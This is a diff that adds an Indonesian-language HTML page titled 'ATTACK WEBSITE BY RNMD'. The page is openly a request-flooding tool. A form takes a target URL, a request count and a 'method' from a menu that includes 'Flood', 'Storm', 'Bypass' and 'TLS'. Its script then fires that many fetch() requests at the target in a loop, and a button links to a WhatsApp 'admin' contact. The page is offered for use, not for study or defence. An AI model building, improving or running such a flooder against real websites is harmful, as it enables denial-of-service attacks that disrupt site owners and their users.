@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ATTACK WEBSITE BY RNMD</title>
+    <style>
+        /* Styling untuk body */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: url('https://pomf2.lain.la/f/5p6e5yj4.png') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: white;
+        }
+
+        /* Form styling */
+        .form-container {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            width: 300px;
+            text-align: center;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 10px;
+        }
+
+        input, select, button {
+            width: 100%;
+            margin-bottom: 15px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+
+        /* Pesan mengambang dengan animasi smooth */
+        .floating-message {
+            position: fixed;
+            top: 30%;
+            left: 50%;
+            transform: translate(-50%, -50%) translateY(-20px);
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 16px;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.5s ease, transform 0.5s ease;
+            z-index: 1000;
+        }
+
+        .floating-message.show {
+            opacity: 1;
+            transform: translate(-50%, -50%) translateY(0);
+        }
+
+        /* Styling tombol hubungi admin */
+        .contact-admin-btn {
+            margin-top: 15px;
+            background-color: #25d366; /* WhatsApp green */
+            color: white;
+            border: none;
+            cursor: pointer;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 14px;
+            transition: background-color 0.3s;
+        }
+
+        .contact-admin-btn:hover {
+            background-color: #128c7e; /* Darker green */
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <h2>ATTACK WEBSITE BY RNMD</h2>
+        <form id="requestForm">
+            <label for="url">URL:</label>
+            <input type="text" id="url" name="url" placeholder="Masukkan URL" required>
+
+            <label for="method">Metode Request:</label>
+            <select id="method" name="method">
+                <option value="GET">GET</option>
+                <option value="POST">POST</option>
+                <option value="Bypass">Bypass</option>
+                <option value="TLS">TLS</option>
+                <option value="Flood">Flood</option>
+                <option value="Storm">Storm</option>
+            </select>
+
+            <label for="jumlah">Jumlah Permintaan:</label>
+            <input type="number" id="jumlah" name="jumlah" placeholder="Masukkan jumlah permintaan" required>
+
+            <button type="button" onclick="kirimPermintaan()">Kirim Banyak Permintaan</button>
+        </form>
+
+        <p id="status"></p>
+
+        <!-- Tombol untuk hubungi admin via WhatsApp -->
+        <button class="contact-admin-btn" onclick="window.location.href='https://wa.me/6283193340723'">Hubungi Admin di WhatsApp</button>
+    </div>
+
+    <!-- Pesan mengambang -->
+    <div id="floatingMessage" class="floating-message">Berhasil! Harap jeda 10 detik!</div>
+
+    <script>
+        function kirimPermintaan() {
+            const url = document.getElementById("url").value;
+            const method = document.getElementById("method").value;
+            const jumlah = document.getElementById("jumlah").value;
+
+            if (!url || !jumlah) {
+                alert("Harap isi semua kolom!");
+                return;
+            }
+
+            document.getElementById("status").textContent = "Mengirim permintaan...";
+            const floatingMessage = document.getElementById("floatingMessage");
+
+            for (let i = 0; i < jumlah; i++) {
+                fetch(url, { method })
+                    .then(response => console.log(`Response ${i + 1}:`, response.status))
+                    .catch(error => console.error(`Error ${i + 1}:`, error));
+            }
+
+            // Tampilkan pesan mengambang dengan efek smooth
+            floatingMessage.classList.add("show");
+
+            // Sembunyikan pesan setelah 2 detik dengan efek smooth
+            setTimeout(() => {
+                floatingMessage.classList.remove("show");
+            }, 2000);
+
+            document.getElementById("status").textContent = "Permintaan terkirim!";
+        }
+    </script>
+</body>
+  </html>
